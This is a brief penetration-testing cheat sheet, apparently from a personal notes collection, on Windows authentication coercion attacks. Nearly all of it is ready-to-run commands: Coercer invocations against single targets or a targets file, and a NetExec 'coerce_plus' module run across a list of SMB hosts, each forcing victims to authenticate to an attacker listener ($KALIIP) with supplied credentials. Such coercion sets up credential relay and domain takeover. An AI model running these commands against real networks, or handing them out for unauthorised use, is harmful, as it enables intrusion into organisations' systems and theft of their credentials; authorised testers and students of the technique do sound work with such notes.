---
tags:
  - security
---
A coersion tool that tests multiple coersion attacks.

```bash
coercer coerce --t <ip> --listener-ip $KALIIP -u $USER -p $USERPASS
```

```bash
coercer coerce --targets-file targets.txt --listener-ip $KALIIP -u $USER -p $USERPASS
```
# Mass Coersion with NXC
```
nxc smb scope_smb_ips.txt -u $USER -p $USERPASS -M coerce_plus -o LISTENER=$KALIIP
```